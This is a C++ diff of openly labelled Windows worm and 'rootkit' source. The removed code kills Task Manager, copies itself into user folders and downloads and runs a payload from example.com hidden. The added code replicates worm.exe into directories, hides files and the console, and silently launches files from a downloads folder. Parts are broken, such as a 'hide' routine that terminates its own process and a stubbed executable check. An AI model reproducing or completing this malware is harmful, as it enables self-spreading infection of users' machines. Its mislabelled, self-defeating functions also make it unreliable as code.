@@ -2,102 +2,143 @@
 #include <vector>
 #include <filesystem>
 #include <Windows.h>
-#include <thread>
 #include <fstream>
+#include <thread>
 #include <chrono>
-#include <ctime>
-#include <urlmon.h>
-#include <wininet.h>
+#include <TlHelp32.h>
+#include <Shellapi.h>
 
-#pragma comment(lib, "urlmon.lib")
-#pragma comment(lib, "wininet.lib")
+// Declaration of IsValidExecutableFunc
+typedef bool (*IsValidExecutableFunc)(const std::string&);
 
 namespace fs = std::filesystem;
 
-class EnigmaticWorm {
+class ProcessHider {
 public:
-    void crypticControlFlow() {
-        int x1 = 2, x2 = 6, x3 = x1 * x2 + (x1 + x2);
-        if (x3 % 2 == 0) {
-            while (x1 < x3) {
-                x2 *= 2;
-                x1 += x2;
-            }
-        }
-        std::string enigmaticString = "tacocat";
-        std::vector<char> encryptedData;
-        for (const auto& c : enigmaticString) {
-            encryptedData.push_back(c + 3);
+    static void HideProcess() {
+        HWND hwnd = FindWindowA(NULL, "ConsoleWindowClass");
+        if (hwnd != NULL) {
+            ShowWindow(hwnd, SW_HIDE);
         }
     }
+};
 
-    void vanishConsole() {
-        HWND hwnd = GetConsoleWindow();
-        ShowWindow(hwnd, SW_MINIMIZE);
-        SetWindowLong(hwnd, GWL_EXSTYLE, GetWindowLong(hwnd, GWL_EXSTYLE) | WS_EX_LAYERED);
-        SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), 0, LWA_COLORKEY);
-    }
+class ProcessEnumerator {
+public:
+    static void HideWormProcess() {
+        DWORD currentProcessId = GetCurrentProcessId();
+        HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hProcessSnap == INVALID_HANDLE_VALUE) {
+            return;
+        }
 
-    void obscureTermination(const std::string& targetProcess) {
-        PROCESSENTRY32 processEntry;
-        processEntry.dwSize = sizeof(PROCESSENTRY32);
-        HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        PROCESSENTRY32 pe32;
+        pe32.dwSize = sizeof(PROCESSENTRY32);
+        if (!Process32First(hProcessSnap, &pe32)) {
+            CloseHandle(hProcessSnap);
+            return;
+        }
 
-        if (Process32First(processSnapshot, &processEntry)) {
-            do {
-                if (rand() % 2 == 0 && _stricmp(processEntry.szExeFile, targetProcess.c_str()) == 0) {
-                    HANDLE processHandle = OpenProcess(PROCESS_TERMINATE, 0, processEntry.th32ProcessID);
-                    TerminateProcess(processHandle, 0);
-                    CloseHandle(processHandle);
+        do {
+            if (pe32.th32ProcessID == currentProcessId) {
+                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
+                if (hProcess != NULL) {
+                    TerminateProcess(hProcess, 0);
+                    CloseHandle(hProcess);
                 }
-            } while (Process32Next(processSnapshot, &processEntry));
+                break;
+            }
+        } while (Process32Next(hProcessSnap, &pe32));
+
+        CloseHandle(hProcessSnap);
+    }
+};
+
+class FileHider {
+public:
+    static void HideWormFile(const std::string& wormPath) {
+        DWORD attributes = GetFileAttributes(wormPath.c_str());
+        if (attributes != INVALID_FILE_ATTRIBUTES) {
+            SetFileAttributes(wormPath.c_str(), attributes | FILE_ATTRIBUTE_HIDDEN);
         }
+    }
+};
 
-        CloseHandle(processSnapshot);
+class WormReplicator {
+public:
+    static void ReplicateWorm(const std::string& sourcePath, const std::string& destinationDirectory) {
+        std::string destinationPath = destinationDirectory + "\\worm.exe";
+        std::ifstream sourceFile(sourcePath, std::ios::binary);
+        std::ofstream destinationFile(destinationPath, std::ios::binary);
+        destinationFile << sourceFile.rdbuf();
+    }
+};
+
+class DownloadExecutor {
+public:
+    static void ExecuteDownload(const std::string& filePath) {
+        ShellExecute(NULL, "open", filePath.c_str(), NULL, NULL, SW_HIDE);
+    }
+};
+
+class DownloadMonitor {
+public:
+    static void MonitorDownloads(const std::string& downloadDirectory) {
+        while (true) {
+            for (const auto& entry : fs::directory_iterator(downloadDirectory)) {
+                if (fs::is_regular_file(entry.path())) {
+                    std::string filePath = entry.path().string();
+                    if (IsValidExecutable(filePath)) {
+                        DownloadExecutor::ExecuteDownload(filePath);
+                    }
+                }
+            }
+            std::this_thread::sleep_for(std::chrono::seconds(5));
+        }
     }
 
-    void cloakWormFile(const std::string& wormPath) {
-        SetFileAttributes(wormPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ENCRYPTED);
+    static bool IsValidExecutable(const std::string& filePath) {
+        // Placeholder implementation
+        return false;
     }
+};
 
-    void downloadAndExecute(const std::string& url, const std::string& destination) {
-        URLDownloadToFile(NULL, url.c_str(), destination.c_str(), 0, NULL);
-        ShellExecute(NULL, "open", destination.c_str(), NULL, NULL, SW_HIDE);
+class EventDrivenWorm {
+public:
+    static void ActivateOnStartup() {
+        std::cout << "Worm activated on system startup." << std::endl;
+        // Insert worm activation code here
     }
+};
 
-    void initiateMayhem() {
-        std::vector<std::string> crypticDirectories;
-        for (const auto& entry : fs::directory_iterator("C:\\Users\\User\\Documents")) {
+class Rootkit {
+public:
+    static void StartWorm(const std::string& initialDirectory) {
+        std::vector<std::string> targetDirectories;
+        for (const auto& entry : fs::directory_iterator(initialDirectory)) {
             if (fs::is_directory(entry.path())) {
-                crypticDirectories.push_back(entry.path().string());
+                targetDirectories.push_back(entry.path().string());
             }
         }
-        for (const auto& crypticDir : crypticDirectories) {
-            std::string obscureWormName = crypticDir + "\\worm_" + std::to_string(std::time(nullptr)) + ".exe";
-            fs::copy_file("worm.exe", obscureWormName, fs::copy_options::overwrite_existing);
+        for (const auto& directory : targetDirectories) {
+            WormReplicator::ReplicateWorm("worm.exe", directory);
         }
-        std::thread chaosThread([]() {
-            // Additional chaos-inducing functionality here
-            std::this_thread::sleep_for(std::chrono::minutes(1));
-        });
-        chaosThread.detach();
+
+        std::thread downloadThread(DownloadMonitor::MonitorDownloads, "C:\\Downloads");
+        downloadThread.detach();
     }
 
-    int obscuredEntryPoint() {
-        crypticControlFlow();
-        vanishConsole();
-        obscureTermination("Taskmgr.exe");
-        cloakWormFile("C:\\Users\\User\\Documents\\worm.exe");
-        initiateMayhem();
+    static int RootkitMain() {
+        StartWorm("C:\\Users\\User\\Documents");
+        ProcessHider::HideProcess();
+        ProcessEnumerator::HideWormProcess();
+        FileHider::HideWormFile("C:\\Users\\User\\Documents\\worm.exe");
 
-        // Download and execute a file (e.g., a payload from a URL)
-        std::string downloadUrl = "https://example.com/payload.exe";
-        std::string downloadDestination = "C:\\Downloads\\payload.exe";
-        downloadAndExecute(downloadUrl, downloadDestination);
+        // Activate worm on system startup
+        EventDrivenWorm::ActivateOnStartup();
 
         while (true) {
-            // Endless enigmatic activities
-            std::this_thread::sleep_for(std::chrono::minutes(1));
+            Sleep(1000);
         }
 
         return 0;
